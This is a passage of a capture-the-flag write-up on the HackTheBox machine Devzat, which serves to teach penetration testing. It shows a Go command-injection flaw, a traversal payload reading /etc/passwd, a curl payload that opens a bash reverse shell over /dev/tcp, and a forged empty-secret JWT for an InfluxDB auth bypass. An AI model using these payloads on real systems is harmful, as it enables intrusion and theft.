---
title: HTB: Devzat
url: https://0xdf.gitlab.io/2022/03/12/htb-devzat.html
date: 2022-03-12T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-devzat, nmap, ubuntu, vhosts, wfuzz, devzat, feroxbuster, golang, git, source-code, file-read, directory-traversal, command-injection, influxdb, cve-2019-20933, jwt, pyjwt, jwt-io, htb-cereal, htb-dyplesher, htb-travel, htb-epsilon
---

![Devzat](https://0xdfimages.gitlab.io/img/devzat-cover.png)

Devzat is centered around a chat over SSH tool called Devzat. To start, I can connect, but there is at least one username I can’t access. I’ll find a pet-themed site on a virtual host, and find it has an exposed git repository. Looking at the code shows file read / directory traversal and command injection vulnerabilities. I’ll use the command injection to get a shell. From localhost, I can access the chat for the first user, where there’s history showing another user telling them about an influxdb instance. I’ll find an auth bypass exploit to read the db, and get the next user’s password. This user has access to the source for a new version of Devzat. Analysis of this version shows a new command, complete with a file read vulnerability that I’ll use to read root’s private key and get a shell over SSH.

## Box Info

| Name | [Devzat](https://hackthebox.com/machines/devzat)  [Devzat](https://hackthebox.com/machines/devzat) [Play on HackTheBox](https://hackthebox.com/machines/devzat) |
| --- | --- |
| Release Date | [16 Oct 2021](https://twitter.com/hackthebox_eu/status/1448310456758702094) |
| Retire Date | 12 Mar 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Devzat |
| Radar Graph | Radar chart for Devzat |
| First Blood User | 00:31:11[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:33:50[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [c1sc0 c1sc0](https://app.hackthebox.com/users/34604) |

## Recon

### nmap

`nmap` found three open TCP ports, two SSH (22, 8000) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.118
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 14:31 EDT
Warning: 10.10.11.118 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.118
Host is up (0.11s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 102.26 seconds

oxdf@hacky$ nmap -sCV -p 22,80,8000 -oA scans/nmap-tcpscripts 10.10.11.118
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 08:12 EDT
Nmap scan report for 10.10.11.118
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=10/14%Time=61681EC6%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.32 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Focal 20.04.

`SSH-2.0-Go` is interesting, and on TCP 8000.

On 80, there’s a TCP redirect to `http://devzat.htb`, so I’ll add that to `/etc/hosts`.

### VHost Fuzz

Given the usage of hostnames, I’ll run `wfuzz` to look for others. A quick run without the `--hw 26` shows that the default response change the number of characters in the response, but not the number of words, so that’s why I’ll use the “Hide 26 Words” flag.

```

oxdf@hacky$ wfuzz -u http://devzat.htb -H 'Host: FUZZ.devzat.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devzat.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000003745:   200        20 L     35 W       510 Ch      "pets"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0

```

I’ll add `pets.devzat.htb` to `/etc/hosts` as well:

```
10.10.11.118 devzat.htb pets.devzat.htb

```

### devzat.htb - TCP 80

#### Site

The site is talking about the chat application, Devzat:

[![](https://0xdfimages.gitlab.io/img/image-20211016144318790.png)](https://0xdfimages.gitlab.io/img/image-20211016144318790.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211016144318790.png)

There’s a username at the bottom:

![image-20211016144337400](https://0xdfimages.gitlab.io/img/image-20211016144337400.png)

There are also instructions for how to connect to the chat:

![image-20211016173511363](https://0xdfimages.gitlab.io/img/image-20211016173511363.png)

#### Tech Stack

Trying to load the page as `/index.php` returns a 404 not found. `/index.html` does load the page. This, along with the fact that there are no links on the page, is a good indication this is likely a static site.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` since that’s what the index page used:

```

oxdf@hacky$ feroxbuster -u http://devzat.htb -x html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devzat.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      309c http://devzat.htb/images
301        9l       28w      309c http://devzat.htb/assets
301        9l       28w      313c http://devzat.htb/javascript
301        9l       28w      312c http://devzat.htb/assets/js
301        9l       28w      313c http://devzat.htb/assets/css
200      191l      623w     6527c http://devzat.htb/index.html
200      390l     1474w    18850c http://devzat.htb/elements.html
301        9l       28w      320c http://devzat.htb/assets/css/images
200       83l      510w     4851c http://devzat.htb/generic.html
403        9l       28w      275c http://devzat.htb/server-status
[####################] - 4m    419986/419986  0s      found:10      errors:4186   
[####################] - 4m     59998/59998   229/s   http://devzat.htb
[####################] - 4m     59998/59998   214/s   http://devzat.htb/images
[####################] - 4m     59998/59998   215/s   http://devzat.htb/assets
[####################] - 4m     59998/59998   215/s   http://devzat.htb/javascript
[####################] - 4m     59998/59998   212/s   http://devzat.htb/assets/js
[####################] - 4m     59998/59998   215/s   http://devzat.htb/assets/css
[####################] - 4m     59998/59998   220/s   http://devzat.htb/assets/css/images

```

`elements.html` and `generic.html` are both new, but both just return some Ipsum text and look like default pages for the Bootstrap theme.

### devzat - TCP 8000

`nmap` identified port 8000 as SSH, which matches the instructions from the site. I’ll connect to it with SSH (using `-p 8000`):

```

oxdf@hacky$ ssh -p 8000 oxdf@devzat.htb
Warning: Permanently added '[10.10.11.118]:8000' (RSA) to the list of known hosts.
Welcome to the chat. There are no more users
devbot: oxdf has joined the chat
oxdf: 

```

Because of the name of the box, or googling for SSH chat clients, I’ll find [devzat](https://github.com/quackduck/devzat).

I can type into the chat, but nothing comes back:

```

oxdf: hello?
oxdf:

```

If I try logging in as another user, I can see the chats from oxdf:

```

oxdf@hacky$ ssh -p 8000 otheruser@devzat.htb
2 minutes earlier
devbot: You seem to be new here oxdf. Welcome to Devzat! Run /help to see what you can do.
devbot: oxdf has joined the chat
oxdf: hello?
Welcome to the chat. There is one more user
devbot: otheruser has joined the chat
otheruser: hello!
otheruser: 

```

There’s some oddness that devbot is still calling me oxdf in the second chat, but perhaps that’s IP-based?

The hello from otheruser does show up in oxdf’s window as well:

```

devbot: oxdf has joined the chat
oxdf: hello?
2 minutes in
devbot: otheruser has joined the chat
otheruser: hello!
oxdf:

```

I did find the username patrick earlier. If I try to connect to chat as patrick, it blocks it:

```

oxdf@hacky$ ssh -p 8000 patrick@devzat.htb
Nickname reserved for local use, please choose a different one.
> 

```

I’ll try that again when I can access from localhost.

### pets.devzat.htb

#### Site

The site is a front end on a pets database:

[![image-20211016145757958](https://0xdfimages.gitlab.io/img/image-20211016145757958.png)](https://0xdfimages.gitlab.io/img/image-20211016145757958.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211016145757958.png)

There’s a form at the bottom to add a pet:

![image-20220311075613274](https://0xdfimages.gitlab.io/img/image-20220311075613274.png)

The user only gets to give a name and select a species from the dropdown:

![image-20220311075627153](https://0xdfimages.gitlab.io/img/image-20220311075627153.png)

I’m able to add a pet, and the characteristics seem to be the same based on the species:

[![image-20211016145840779](https://0xdfimages.gitlab.io/img/image-20211016145840779.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211016145840779.png)

On clicking the trash can to delete a pet, it just says that’s not implemented:

![image-20211016155616808](https://0xdfimages.gitlab.io/img/image-20211016155616808.png)

#### Requests

When I send a new pet, it generates a POST request to `/api/pet`:

```

POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 31
DNT: 1
Connection: close

{"name":"0xdf","species":"cat"}

```

The responses have a custom Server header:

```

HTTP/1.1 200 OK
Date: Fri, 11 Mar 2022 13:01:15 GMT
Server: My genious go pet server
Content-Length: 26
Content-Type: text/plain; charset=utf-8
Connection: close

Pet was added successfully

```

#### nmap

Given the fresh host, I’ll re-run `nmap` scripts on the web port:

```

oxdf@hacky$ nmap -sCV -p 80 -oA scans/nmap-scripts-pets pets.devzat.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 15:14 EDT
Nmap scan report for pets.devzat.htb (10.10.11.118)
Host is up (0.018s latency).
rDNS record for 10.10.11.118: devzat.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
| http-git: 
|   10.10.11.118:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: back again to localhost only 
| http-server-header: 
|   Apache/2.4.41 (Ubuntu)
|_  My genious go pet server
|_http-title: Pet Inventory

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds

```

It finds a `.git` on the webserver, which typically means I can leak out the page source.

Visiting `pets.devzat.htb/.git` shows that directory listing is enabled:

![image-20211016162016064](https://0xdfimages.gitlab.io/img/image-20211016162016064-16344156818321.png)

### .git

#### Collect

I need to collect all the files from this directory to reproduce the source. If directory listing weren’t enabled on the site, I could use a tool like [git-dumper](https://github.com/arthaud/git-dumper) or [GitTools](https://github.com/internetwache/GitTools). Both of these use the known file names in a Git repo to get the other file names, and then collects all the needed files. I’ve shown `git-dumper` in [Hackvent 2021](/hackvent2021#get-git), and GitTools in [Cereal](/2021/05/29/htb-cereal.html#git), [Dyplesher](/2020/10/24/htb-dyplesher.html#get-git), [Travel](/2020/09/12/htb-travel.html#automated-clone), and [Epsilon](/2022/03/10/htb-epsilon.html#git-repo).

In this case, because directory listing is enabled, I can just use `wget` to recursively get all the files:

```

oxdf@hacky$ wget -r http://pets.devzat.htb/.git/
--2021-10-16 16:18:15--  http://pets.devzat.htb/.git/
Resolving pets.devzat.htb (pets.devzat.htb)... 10.10.11.118
Connecting to pets.devzat.htb (pets.devzat.htb)|10.10.11.118|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 345 [text/html]
Saving to: ‘pets.devzat.htb/.git/index.html’

pets.devzat.htb/.git/index.html                      100%[=====================================================================================================================>]     345  --.-KB/s    in 0s       

2021-10-16 16:18:15 (76.0 MB/s) - ‘pets.devzat.htb/.git/index.html’ saved [345/345]

Loading robots.txt; please ignore errors.
--2021-10-16 16:18:15--  http://pets.devzat.htb/robots.txt
Reusing existing connection to pets.devzat.htb:80.
HTTP request sent, awaiting response... 200 OK
Length: 510 [text/html]
Saving to: ‘pets.devzat.htb/robots.txt’

pets.devzat.htb/robots.txt                           100%[=====================================================================================================================>]     510  --.-KB/s    in 0s      

2021-10-16 16:18:15 (100 MB/s) - ‘pets.devzat.htb/robots.txt’ saved [510/510]
--2021-10-16 16:18:15--  http://pets.devzat.htb/.git/COMMIT_EDITMSG
...[snip]...

```

The resulting files will be in a directory named `pets.devzat.htb`. It doesn’t contain much:

```

oxdf@hacky$ ls -la pets.devzat.htb/
total 16
drwxrwx--- 1 root vboxsf 4096 Oct 16 16:18 .
drwxrwx--- 1 root vboxsf 4096 Oct 16 16:25 ..
drwxrwx--- 1 root vboxsf 4096 Oct 16 16:18 .git
-rwxrwx--- 1 root vboxsf  510 Oct 16 16:18 robots.txt

```

Going into that dir and running `git status`, it’s going to show a bunch of files as deleted:

```

oxdf@hacky$ git status 
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    .gitignore
        deleted:    characteristics/bluewhale
        deleted:    characteristics/cat
        deleted:    characteristics/dog
        deleted:    characteristics/giraffe
        deleted:    characteristics/gopher
        deleted:    characteristics/petshop
        deleted:    characteristics/redkite
        deleted:    go.mod
        deleted:    go.sum
        deleted:    main.go
        deleted:    petshop
        deleted:    start.sh
        deleted:    static/.gitignore
        deleted:    static/README.md
...[snip]...
        deleted:    static/rollup.config.js
        deleted:    static/src/App.svelte
        deleted:    static/src/main.js

Untracked files:
  (use "git add <file>..." to include in what will be committed)
        robots.txt

no changes added to commit (use "git add" and/or "git commit -a")

```

That’s because Git’s records say that as of the last commit, those files should be there, but they aren’t, so it thinks they are deleted.

I’ll do a `reset`, and now the files are there:

```

oxdf@hacky$ git reset --hard HEAD
HEAD is now at ef07a04 back again to localhost only
oxdf@hacky$ ls -la
total 9772
drwxrwx--- 1 root vboxsf    4096 Oct 16 16:35 .
drwxrwx--- 1 root vboxsf    4096 Oct 16 16:35 ..
drwxrwx--- 1 root vboxsf    4096 Oct 16 16:35 characteristics
drwxrwx--- 1 root vboxsf    4096 Oct 16 16:35 .git
-rwxrwx--- 1 root vboxsf      25 Oct 16 16:35 .gitignore
-rwxrwx--- 1 root vboxsf      88 Oct 16 16:35 go.mod
-rwxrwx--- 1 root vboxsf     163 Oct 16 16:35 go.sum
-rwxrwx--- 1 root vboxsf    4420 Oct 16 16:35 main.go
-rwxrwx--- 1 root vboxsf 9957033 Oct 16 16:35 petshop
-rwxrwx--- 1 root vboxsf     510 Oct 16 16:35 robots.txt
-rwxrwx--- 1 root vboxsf     123 Oct 16 16:35 start.sh
drwxrwx--- 1 root vboxsf    4096 Oct 16 16:35 static

```

#### Source Analysis

`main.go` is the file with the webserver in it. There’s a function, `loadCharacter` that’s interesting:

```

func loadCharacter(species string) string {
    cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
    stdoutStderr, err := cmd.CombinedOutput()
    if err != nil {
        return err.Error()
    }            
    return string(stdoutStderr)
} 

```

It’s using the `exec.Command` function to read static files based on the filename. Looking at the pets that are on the site to start with, it’s using this function for each in the `Characteristics` field:

```

var (                      
    Pets []Pet = []Pet{
        {Name: "Cookie", Species: "cat", Characteristics: loadCharacter("cat")},
        {Name: "Mia", Species: "cat", Characteristics: loadCharacter("cat")},
        {Name: "Chuck", Species: "dog", Characteristics: loadCharacter("dog")},
        {Name: "Balu", Species: "dog", Characteristics: loadCharacter("dog")},
        {Name: "Georg", Species: "gopher", Characteristics: loadCharacter("gopher")},
        {Name: "Gustav", Species: "giraffe", Characteristics: loadCharacter("giraffe")},
        {Name: "Rudi", Species: "redkite", Characteristics: loadCharacter("redkite")},
        {Name: "Bruno", Species: "bluewhale", Characteristics: loadCharacter("bluewhale")},
    }      
) 

```

When I add a new pet, it’s called as well:

```

func addPet(w http.ResponseWriter, r *http.Request) {
    reqBody, _ := ioutil.ReadAll(r.Body)
    var addPet Pet
    err := json.Unmarshal(reqBody, &addPet)
    if err != nil {
        e := fmt.Sprintf("There has been an error: %+v", err)
        http.Error(w, e, http.StatusBadRequest)
        return
    }

    addPet.Characteristics = loadCharacter(addPet.Species)
    Pets = append(Pets, addPet)

    w.WriteHeader(http.StatusOK)
    fmt.Fprint(w, "Pet was added successfully")
}

```

There’s no validation, so I can inject into the species field and likely get both file include and command execution.

## Shell as partick

### File Read POC

I don’t really need it (because command injection gives everything file read can give and more), but this is vulnerabile to a directory traversal / file read vulnerability. For example, if I submit the following to the API:

```

POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 60
Connection: close

{"name":"0xdf","species":"../../../../../../../etc/passwd"}

```

The server will eventually run a command to get the description:

```

sh -c cat characteristics/../../../../../../../etc/passwd

```

And it will show up on the page (sometimes it takes a couple refreshes if you’re working out of Repeater):

![image-20220311102709002](https://0xdfimages.gitlab.io/img/image-20220311102709002.png)

### Command Injection POC

Command injection is the more useful exploit, so I’ll turn there. Given that I know this line from the source:

```

cmd := exec.Command("sh", "-c", "cat characteristics/"+species)

```

I’ll try submitting a payload with `species` as `cat; ping -c 1 10.10.14.9`:

```

oxdf@hacky$ curl -X POST http://pets.devzat.htb/api/pet -d '{ "name": "0xdf",  "species": "cat; ping -c 1 10.10.14.9" }' -H "'Content-Type': 'application/json'"
Pet was added successfully

```

This will make the Go goes run:

```

cmd := exec.Command("sh", "-c", "cat characteristics/cat; ping -c 1 10.10.14.9")

```

I’ll have `tcpdump` listening when I send that, and it gets an ICMP packet back immediately:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:25:55.580905 IP 10.10.11.118 > 10.10.14.9: ICMP echo request, id 2, seq 1, length 64
14:25:55.580926 IP 10.10.14.9 > 10.10.11.118: ICMP echo reply, id 2, seq 1, length 64

```

### Shell

To convert this to a reverse shell, I’ll just change the `ping` to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ curl -X POST http://pets.devzat.htb/api/pet -d '{ "name": "0xdf",  "species": "cat; bash -c \"bash -i >& /dev/tcp/10.10.14.9/443 0>&1\"" }' -H "'Content-Type': 'application/json'"

```

With `nc` listening, sending that just hangs. At `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.118.
Ncat: Connection from 10.10.11.118:51448.
bash: cannot set terminal process group (865): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$ 

```

I’ll upgrade my shell with `script`:

```

patrick@devzat:~/pets$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
patrick@devzat:~/pets$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg  
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
patrick@devzat:~/pets$

```

There’s also an SSH key in `/home/patrick/.ssh`, so I can grab that and get a solid shell.

## Shell as catherine

### Enumeration

#### Home Dirs

Patrick’s home directory has the code for Devzat, Go, and the Pets site:

```

patrick@devzat:~$ ls -la
total 52
drwxr-xr-x 9 patrick patrick 4096 Sep 24 14:57 .
drwxr-xr-x 4 root    root    4096 Jun 22 18:26 ..
lrwxrwxrwx 1 root    root       9 Jun 22 20:40 .bash_history -> /dev/null
-rw-r--r-- 1 patrick patrick  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 patrick patrick 3809 Jun 22 18:43 .bashrc
drwx------ 3 patrick patrick 4096 Jun 22 20:17 .cache
drwx------ 3 patrick patrick 4096 Jun 23 16:00 .config
drwxr-x--- 2 patrick patrick 4096 Sep 23 15:07 devzat
-rw-rw-r-- 1 patrick patrick   51 Jun 22 19:52 .gitconfig
drwxrwxr-x 3 patrick patrick 4096 Jun 22 18:51 go
drwxrwxr-x 4 patrick patrick 4096 Jun 22 18:50 .npm
drwxrwx--- 5 patrick patrick 4096 Jun 23 19:05 pets
-rw-r--r-- 1 patrick patrick  807 Feb 25  2020 .profile
drwxrwxr-x 2 patrick patrick 4096 Oct 16 19:20 .ssh

```

There’s nothing too interesting here.

There’s another user, catherine:

```

patrick@devzat:/home$ ls 
catherine  patrick
patrick@devzat:/home$ ls -la catherine/
total 32
drwxr-xr-x 4 catherine catherine 4096 Sep 21 19:35 .
drwxr-xr-x 4 root      root      4096 Jun 22 18:26 ..
lrwxrwxrwx 1 root      root         9 Jun 22 20:41 .bash_history -> /dev/null
-rw-r--r-- 1 catherine catherine  220 Jun 22 18:26 .bash_logout
-rw-r--r-- 1 catherine catherine 3808 Jun 22 18:44 .bashrc
drwx------ 2 catherine catherine 4096 Sep 21 19:35 .cache
-rw-r--r-- 1 catherine catherine  807 Jun 22 18:26 .profile
drwx------ 2 catherine catherine 4096 Oct 16 19:21 .ssh
-r-------- 1 catherine catherine   33 Oct 13 13:33 user.txt

```

`user.txt` is there, but I can’t access it as patrick.

#### devzat

When I tried to connect to devzat as patrick during [initial enumeration], it said that name was reserved for local access. I’ll try again from Devzat:

```

patrick@devzat:~$ ssh -p 8000 localhost
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business
       meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
patrick:

```

There’s some history there with admin, and it mentions an InfluxDB instance that admin set up.

#### netstat

Looking at `netstat`, there are a couple services listening on localhost only:

```

patrick@devzat:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      878/./petshop       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      876/./devchat       
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

```

5000 is the `petshop` Go binary. The Apache configs in `/etc/apache2/sites-enabled/000-default.conf` show that anything to the `pets.devzat.htb` host is proxied to localhost port 5000:

```

<VirtualHost *:80>
    AssignUserID patrick patrick
    ServerName pets.devzat.htb
    ServerAlias pets.devzat.htb
    ServerAdmin support@pets.devzat.htb

    # Reverse Proxy to petshop api
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:5000/
    ProxyPassReverse / http://pets.devzat.htb:80/

    # Logging
    LogFormat "%h %l %u %t \"%r\" %>s %b"
    ErrorLog /var/log/apache2/petshop_error.log    
    CustomLog /var/log/apache2/petshop.log combined
</Virtualhost>

```

8443 looks like a webport, but it doesn’t respond to `curl` on HTTP or HTTPS:

```

patrick@devzat:~$ curl http://localhost:8443
curl: (1) Received HTTP/0.9 when not allowed

patrick@devzat:~$ curl https://localhost:8443
curl: (35) error:1408F10B:SSL routines:ssl3_get_record:wrong version number

```

I’ll revisit this later.

The [docs for InfluxDb](https://archive.docs.influxdata.com/influxdb/v1.2/administration/ports/) show that 8086 is the default port for the InfluxDB HTTP service.

### InfluxDB

#### Initial Enum

Just doing a curl of 8086 returns a 404:

```

patrick@devzat:~$ curl localhost:8086   
404 page not found

```

Running `curl` with `-v` gives the Influx version in the response headers:

```

patrick@devzat:~$ curl -v http://localhost:8086
*   Trying 127.0.0.1:8086...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8086 (#0)
> GET / HTTP/1.1
> Host: localhost:8086
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Content-Type: text/plain; charset=utf-8
< X-Content-Type-Options: nosniff
< X-Influxdb-Build: OSS
< X-Influxdb-Version: 1.7.5
< Date: Sun, 17 Oct 2021 19:14:32 GMT
< Content-Length: 19
< 
404 page not found
* Connection #0 to host localhost left intact

```

[These docs](https://docs.influxdata.com/influxdb/v1.8/guides/query_data/#query-data-with-influxql) show how to query InfluxDB with `curl` with an example like:

```

curl -G 'http://localhost:8086/query?pretty=true' --data-urlencode "db=mydb" --data-urlencode "q=SELECT \"value\" FROM \"cpu_load_short\" WHERE \"region\"='us-west'"

```

I tried a simpler version of that, to just run the [command](https://docs.influxdata.com/influxdb/v1.8/query_language/explore-schema/) to show the databases:

```

patrick@devzat:~$ curl -G 'http://localhost:8086/query?pretty=true' --data-urlencode "q=SHOW DATABASES"
{
    "error": "unable to parse authentication credentials"
}

```

I’m going to need creds or an auth bypass.

#### Identify CVE-2019-20933

Some Goolging for InfluxDB and this version led to posts about CVE-2019-20933. That’s kind of an old CVE. Still, [it impacts](https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-20933&scoretype=cvssv2) 1.75:

> InfluxDB prior to 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).

[This GitHub issue](https://github.com/influxdata/influxdb/issues/12927) looks to be where this vulnerability gets fixed:

[![image-20220311090228725](https://0xdfimages.gitlab.io/img/image-20220311090228725.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220311090228725.png)

[This blog](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day) is from the people who found the vulnerability (I believe, though it doesn’t mention the CVE in the post).

#### Identify Usernames

The first step in the blog post is it get a list of users using `/debug/requests`. On Devzat, it hangs for a minute and returns nothing:

```

patrick@devzat:~$ curl http://localhost:8086/debug/requests                           
{

}

```

Still, I can guess at a list of possible usernames. admin set up the DB for patrick, and catherine is the user I’m trying to access. I’ll start with those three.

#### JWT Format

I’ll need to know the format of the JWT token in order to forge it. The link in the GitHub issue points to code in `handler.go`, specifically the [case for `BearerAuthentication`](https://github.com/influxdata/influxdb/blob/e2af85d6503ecaaa4dbdbdd9ddad740741dae582/services/httpd/handler.go#L1585-L1634). On line [1604](https://github.com/influxdata/influxdb/blob/e2af85d6503ecaaa4dbdbdd9ddad740741dae582/services/httpd/handler.go#L1604), it parses the `token` into a set of `claims`:

```

claims, ok := token.Claims.(jwt.MapClaims)

```

Later, in lines [1611-1625](https://github.com/influxdata/influxdb/blob/e2af85d6503ecaaa4dbdbdd9ddad740741dae582/services/httpd/handler.go#L1611-L1625), it uses both `claims["exp"]` and `claims["username"]`:

```

// Make sure an expiration was set on the token.
if exp, ok := claims["exp"].(float64); !ok || exp <= 0.0 {
    h.httpError(w, "token expiration required", http.StatusUnauthorized)
    return
}

// Get the username from the token.
username, ok := claims["username"].(string)
if !ok {
    h.httpError(w, "username in token must be a string", http.StatusUnauthorized)
    return
} else if username == "" {
    h.httpError(w, "token must contain a username", http.StatusUnauthorized)
    return
}

```

I don’t see any other fields references, so I’ll start by making a JWT with those two.

#### Craft JWT

I’ll make a token in with [PyJWT](https://pyjwt.readthedocs.io/en/stable/):

```

oxdf@hacky$ python3
Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> import time
>>> int(time.time())
1647008155
>>> jwt.encode({"exp": time.time()+10000, "username": "patrick"}, "", algorithm="HS256")
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDcwMTgyMDIuMDU4MTAzMywidXNlcm5hbWUiOiJwYXRyaWNrIn0.xRh2gVo-K2WMHFTrYqLZgPDkEa0RHL6LrRKsHg5icFA'

```

I’m passing the empty string for the secret.

I can also do the same thing in [jwt.io](https://jwt.io/):

[![image-20211017153323716](https://0xdfimages.gitlab.io/img/image-20211017153323716.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211017153323716.png)

It’s important to make sure to empty the box where the key goes, and check base64.

I’ll send the token via `curl`, and it doesn’t work:

```

